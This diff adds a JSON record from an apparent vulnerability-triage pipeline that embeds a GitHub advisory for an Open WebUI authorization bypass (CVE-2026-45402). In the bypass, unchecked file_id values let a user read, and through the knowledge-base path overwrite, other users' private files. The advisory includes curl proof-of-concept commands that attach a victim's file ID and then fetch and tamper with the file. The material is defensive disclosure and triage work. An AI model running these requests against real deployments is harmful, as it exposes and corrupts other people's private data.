@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/259396703?v=4\", \"events_url\": \"https://api.github.com/users/MrBeard-FT/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/MrBeard-FT/followers\", \"following_url\": \"https://api.github.com/users/MrBeard-FT/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/MrBeard-FT/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/MrBeard-FT\", \"id\": 259396703, \"login\": \"MrBeard-FT\", \"node_id\": \"U_kgDOD3YUXw\", \"organizations_url\": \"https://api.github.com/users/MrBeard-FT/orgs\", \"received_events_url\": \"https://api.github.com/users/MrBeard-FT/received_events\", \"repos_url\": \"https://api.github.com/users/MrBeard-FT/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/MrBeard-FT/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/MrBeard-FT/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/MrBeard-FT\", \"user_view_type\": \"public\"}}, {\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/27028174?v=4\", \"events_url\": \"https://api.github.com/users/Classic298/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/Classic298/followers\", \"following_url\": \"https://api.github.com/users/Classic298/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/Classic298/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/Classic298\", \"id\": 27028174, \"login\": \"Classic298\", \"node_id\": \"MDQ6VXNlcjI3MDI4MTc0\", \"organizations_url\": \"https://api.github.com/users/Classic298/orgs\", \"received_events_url\": \"https://api.github.com/users/Classic298/received_events\", \"repos_url\": \"https://api.github.com/users/Classic298/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/Classic298/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/Classic298/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/Classic298\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-45402\", \"cvss\": {\"score\": 8.1, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 8.1, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-639\", \"name\": \"Authorization Bypass Through User-Controlled Key\"}], \"description\": \"# Cross-User File Access via Unchecked file_id in Folder Knowledge and Knowledge-Base Attach Endpoints\\n\\n## Summary\\n\\nMultiple endpoints accept a user-supplied `file_id` and attach the referenced file to a resource the caller controls (folder knowledge, knowledge-base contents) without verifying that the caller owns or has been granted access to the file. The file's content then becomes reachable through the downstream RAG / file-content paths, allowing any authenticated user to exfiltrate any other user's private file — and on the knowledge-base path, also to overwrite it — given knowledge of the file's UUID.\\n\\n## Affected code paths\\n\\n### Path 1 — Folder knowledge ingestion via `folders.update`\\n\\n`backend/open_webui/routers/folders.py:156` — `POST /api/v1/folders/{id}/update` accepts a `FolderUpdateForm` whose `data: Optional[dict]` field is written verbatim into the folder. The folder consumer at `backend/open_webui/utils/middleware.py:2409` spreads `folder.data['files']` directly into `form_data['files']` for the next chat completion, which becomes RAG context. There is no per-file ownership check at the writer (the update handler) and no per-file ownership check at the reader (the middleware folder consumer) — only the *folder list* endpoint (`folders.py:78-94`) cleans up by stripping inaccessible files, and that runs lazily at folder-list time rather than at chat time. An attacker with a victim's file UUID can write `data: {\\\"files\\\": [{\\\"id\\\": \\\"<victim>\\\", \\\"type\\\": \\\"file\\\"}]}` into their own folder, immediately chat in that folder, and have the LLM return the victim's document content via RAG. The cleanup pass strips the file from persistence later, but the exfiltration has already happened.\\n\\n### Path 2 — Knowledge-base attach via `knowledge.{id}/file/add` and `knowledge.{id}/files/batch/add`\\n\\n`backend/open_webui/routers/knowledge.py:616-669` (`add_file_to_knowledge_by_id`) and `backend/open_webui/routers/knowledge.py:972-1035` (`add_files_to_knowledge_by_id_batch`) check the caller's *write access to the knowledge base* but never validate the caller's access to the `file_id` being attached. Because `has_access_to_file(..., user)` returns True for any file linked to a KB the caller owns, attaching a victim's `file_id` to an attacker-owned KB silently unlocks read **and** write on that file through `/api/v1/files/{id}/content` and `/api/v1/files/{id}/data/content/update`. This is a stronger variant than Path 1 — full read AND overwrite, persisted, no cleanup pass to mitigate.\\n\\n## Proof of concept\\n\\n### Path 1 (folder knowledge)\\n```bash\\n# Attacker writes victim file_id into their own folder\\ncurl -X POST http://target/api/v1/folders/<attacker_folder_id>/update \\\\\\n  -H \\\"Authorization: Bearer $ATK\\\" -H \\\"Content-Type: application/json\\\" \\\\\\n  -d \\\"{\\\\\\\"data\\\\\\\": {\\\\\\\"files\\\\\\\": [{\\\\\\\"id\\\\\\\": \\\\\\\"$VICTIM_FILE_ID\\\\\\\", \\\\\\\"type\\\\\\\": \\\\\\\"file\\\\\\\"}]}}\\\"\\n\\n# Attacker chats in that folder — victim file becomes RAG context\\ncurl -X POST http://target/api/chat/completions \\\\\\n  -H \\\"Authorization: Bearer $ATK\\\" -H \\\"Content-Type: application/json\\\" \\\\\\n  -d \\\"{\\\\\\\"model\\\\\\\":\\\\\\\"any\\\\\\\",\\\\\\\"messages\\\\\\\":[{\\\\\\\"role\\\\\\\":\\\\\\\"user\\\\\\\",\\\\\\\"content\\\\\\\":\\\\\\\"summarise my uploaded document\\\\\\\"}],\\\\\\\"folder_id\\\\\\\":\\\\\\\"<attacker_folder_id>\\\\\\\"}\\\"\\n```\\n  \\n### Path 2 (knowledge-base attach)\\n\\n```\\n# Attacker creates own KB\\nKB=$(curl -s -X POST http://target/api/v1/knowledge/create \\\\\\n  -H \\\"Authorization: Bearer $ATK\\\" -H \\\"Content-Type: application/json\\\" \\\\\\n  -d '{\\\"name\\\":\\\"x\\\",\\\"description\\\":\\\"x\\\",\\\"data\\\":{}}' | jq -r .id)\\n\\n# Attach victim's file_id — no ownership check\\ncurl -X POST http://target/api/v1/knowledge/$KB/file/add \\\\\\n  -H \\\"Authorization: Bearer $ATK\\\" -H \\\"Content-Type: application/json\\\" \\\\\\n  -d \\\"{\\\\\\\"file_id\\\\\\\":\\\\\\\"$VICTIM_FILE_ID\\\\\\\"}\\\"\\n\\n# Read victim file through standard files endpoint (now accessible because file is \\\"linked to KB I own\\\")\\ncurl http://target/api/v1/files/$VICTIM_FILE_ID/content -H \\\"Authorization: Bearer $ATK\\\"\\n\\n# Overwrite\\ncurl -X POST http://target/api/v1/files/$VICTIM_FILE_ID/data/content/update \\\\\\n  -H \\\"Authorization: Bearer $ATK\\\" -H \\\"Content-Type: application/json\\\" \\\\\\n  -d '{\\\"content\\\":\\\"tampered\\\"}'\\n```\\n\\n## Impact\\n\\n- Confidentiality: Any authenticated user can read the contents of any other user's private uploaded file, given knowledge of the file UUID. UUIDs are V4 (not enumerable in practice) but leak through normal usage — file IDs appear in chat sources, in shared chats' citations, in URL paths (/workspace/files/<id>), in browser history / referrer headers, and in any export/share flow that surfaces source metadata.\\n- Integrity: Path 2 (knowledge attach) additionally allows the attacker to overwrite the victim's file content, persisting attacker-controlled text under the victim's file_id. Subsequent reads by the victim or by any RAG flow that ingests the victim's file return the tampered content.\\n- Availability: None directly — file rows are not deleted by these paths.\\n\\n## Recommended fix\\n\\nValidate the supplied file_id against the caller's read access before attaching, in every writer.\\n\\n### Credits\\n\\nPer the consolidation rule in SECURITY.md, credit goes only to reporters who FIRST identified a distinct sub-path that no earlier filing covered.\\n\\nMrBeard-FT — first to identify the folder-knowledge ingestion path (Path 1)\\nClassic298 — first to identify the knowledge-base attach path (Path 2 — /knowledge/{id}/file/add and /files/batch/add)\", \"epss\": {\"percentage\": 0.00346, \"percentile\": 0.26566}, \"ghsa_id\": \"GHSA-r472-mw7m-967f\", \"github_reviewed_at\": \"2026-05-14T20:27:35Z\", \"html_url\": \"https://github.com/advisories/GHSA-r472-mw7m-967f\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-r472-mw7m-967f\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-45402\"}], \"nvd_published_at\": \"2026-05-15T21:16:38Z\", \"published_at\": \"2026-05-14T20:27:35Z\", \"references\": [\"https://github.com/open-webui/open-webui/security/advisories/GHSA-r472-mw7m-967f\", \"https://github.com/open-webui/open-webui/releases/tag/v0.9.5\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-45402\", \"https://github.com/advisories/GHSA-r472-mw7m-967f\"], \"repository_advisory_url\": \"https://api.github.com/repos/open-webui/open-webui/security-advisories/GHSA-r472-mw7m-967f\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/open-webui/open-webui\", \"summary\": \"Open WebUI: Cross-User File Access via Unchecked file_id in Folder Knowledge and Knowledge-Base Attach Endpoints\", \"type\": \"reviewed\", \"updated_at\": \"2026-05-15T23:55:41Z\", \"url\": \"https://api.github.com/advisories/GHSA-r472-mw7m-967f\", \"vulnerabilities\": [{\"first_patched_version\": \"0.9.5\", \"package\": {\"ecosystem\": \"pip\", \"name\": \"open-webui\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 0.9.4\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-r472-mw7m-967f",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "open-webui: <= 0.9.4"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-45402"
+    ],
+    "cvss_score": 8.1,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "open-webui"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-20T19:52:01.957724Z",
+  "provenance": {
+    "content_sha256": "5d68f13eaa054624a7cf6f58f8e66e2bc9e290e65e5a67e46147b07206bbd81e",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-05-14T20:27:35Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-r472-mw7m-967f",
+  "status": "active",
+  "title": "Open WebUI: Cross-User File Access via Unchecked file_id in Folder Knowledge and Knowledge-Base Attach Endpoints",
+  "updated_at": "2026-05-15T23:55:41Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-r472-mw7m-967f"
+}
